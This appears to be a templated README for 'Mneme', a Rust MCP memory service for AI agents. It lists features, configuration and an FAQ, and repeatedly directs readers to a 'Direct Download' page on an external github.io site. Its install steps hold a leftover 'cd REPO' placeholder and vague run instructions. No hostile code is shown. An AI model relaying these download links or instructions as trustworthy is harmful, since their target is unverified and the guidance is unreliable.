# Mneme v2026 - AI memory system 2026

> **Mneme is a local-first Rust MCP memory system for LLMs and agents, built to store, recall, and manage persistent context with semantic search and encryption at rest.**

[![Platform](https://img.shields.io/badge/Platform-local--first%20Rust%20MCP-blue?style=flat-square)](https://github.com)
[![Version](https://img.shields.io/badge/Version-v2026-green?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/ethanlewis1997/mneme-agent-memory-hub?style=flat-square)](https://github.com/ethanlewis1997/mneme-agent-memory-hub)

---

<p align="center">
  <a href="https://ethanlewis1997.github.io/mneme-agent-memory-hub/">
    <img src="https://img.shields.io/badge/Download-Mneme%20Latest-brightgreen?style=for-the-badge" alt="Download Mneme">
  </a>
</p>

> **[Direct Download - Mneme v2026](https://ethanlewis1997.github.io/mneme-agent-memory-hub/)**

---

[Download Latest Build](https://ethanlewis1997.github.io/mneme-agent-memory-hub/)

---

## What Mneme Does

Mneme provides a durable memory layer for LLM-driven systems while staying local and MCP-compatible. It is built to help agents preserve context between sessions, look up prior information through semantic search, and keep memory organized without depending on a remote-first architecture.

This makes it a solid option for developers who need a Rust-based memory service for assistants, coding agents, or research tooling. Embeddings, snapshots, import and export, and controlled forgetting are all included to make memory handling more repeatable and easier to administer.

---

## Key Capabilities

- Persistent memory storage for LLMs and agents
- MCP-native local memory bridge for tool integrations
- Semantic recall powered by embeddings
- Encryption at rest for stored memory data
- Incremental snapshots for ongoing state capture
- Memory import and export for migration and backups
- Responsive web UI dashboard for browsing and managing memory
- Multilingual memory support for broader input handling
- Automatic compression to help keep storage compact
- Rate-limited forgetting for controlled memory pruning

---

## Installation

Get the code and compile it locally with Rust:

```bash
git clone https://github.com/ethanlewis1997/mneme-agent-memory-hub.git
cd REPO
cargo build --release
```

Once the build finishes, start the binary or service using the command produced by your local build output or release package. If you downloaded a packaged release, unpack it first and then run the bundled executable or startup script from the project directory.

---

## Usage

A common setup is to wire Mneme into your agent stack, save memory items, and let MCP handle retrieval when context is needed.

Example flow:
1. Start the Mneme service locally.
2. Connect your LLM client or agent runtime through MCP.
3. Store conversations, notes, or task context in memory.
4. Query stored context with semantic search when you need retrieval.
5. Use snapshots, export, or pruning tools to manage the memory set over time.

If the web dashboard is enabled, open it in your browser to review stored items, inspect snapshots, and manage imported memory.

---

## Configuration

Mneme is usually configured through the local project or runtime settings used by the service. Typical options cover storage location, encryption preferences, snapshot behavior, compression rules, and forgetting thresholds.

Example:

```toml
storage_path = "./memory"
encryption = true
snapshots = true
compression = true
forgetting_rate_limit = "enabled"
```

Tune these values to fit your local deployment and the way your agent workflow retains context.

---

## Requirements

- Local Rust environment for building from source
- A supported operating system for running the local service
- Enough disk space for persistent memory storage, snapshots, and exports
- A compatible MCP client or agent runtime for integration
- Optional browser access for the web UI dashboard

---

## FAQ

**How do I stay current?**  
Grab the latest release or rebuild from the latest repository state whenever you need an updated version.

**Can memory behavior be adjusted?**  
Yes. Storage, encryption, compression, and snapshot behavior are all controlled by configuration.

**What should I check if semantic recall is off?**  
Look over the embeddings setup, make sure the memory was imported or indexed correctly, and review the wording of the query.

**Do I need the web dashboard?**  
No. It is optional, though it can be helpful for inspecting memory content and managing snapshots interactively.

**Where do I begin if something fails?**  
Review the local logs, confirm the Rust build completed successfully, and ensure your MCP client points at the correct service endpoint.

---

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
